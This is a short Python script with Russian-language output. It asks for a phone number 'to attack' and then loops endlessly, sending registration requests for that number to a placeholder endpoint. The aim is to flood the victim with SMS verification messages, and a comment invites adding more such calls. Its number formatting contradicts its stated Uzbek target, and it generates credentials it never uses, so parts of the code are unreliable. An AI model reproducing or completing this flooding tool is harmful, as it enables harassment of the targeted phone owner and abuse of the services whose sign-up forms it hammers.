# Import necessary libraries
import requests
import random
from colorama import Fore 

logo = '''
╔╗────╔═╗╔╗────────╔╗───────
║╚╗╔═╗║╬║║╚╗╔═╗╔══╗║╚╗╔═╗╔╦╗
║╔╣║╬║║╔╝║╬║║╬║║║║║║╬║║╩╣║╔╝
╚═╝╚═╝╚╝─╚═╝╚═╝╚╩╩╝╚═╝╚═╝╚╝─
'''
print(logo) 

# Get user input for the phone number in Uzbek format (998XXXXXXXXX)
_phone = input('Здравствуйте! Введите номер для атаки, например: 9989######### ==> ')
# Phone number formatting
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7' + _phone[1:]
if _phone[0] == '9':
    _phone = '7' + _phone 

# Generate random data for name, password, and username
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
passmegafon = random.choice(list('123456789')) 

iteration = 0
while True:
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com' 

    try:
        # Update the API endpoint to the desired URL for Uzbek numbers
        requests.post("https://example.com/uzbek/register", data={"phone": _phone})
        print(Fore.GREEN + '[+] Uzbek API URL отправлено!')
    except:
        print(Fore.RED + '[-] Не отправлено!') 

    # ... Add more API calls with the updated URL for Uzbek numbers here ... 

    try:
        iteration += 1
        print(('{} следующий цикл.').format(iteration))
    except:
        break
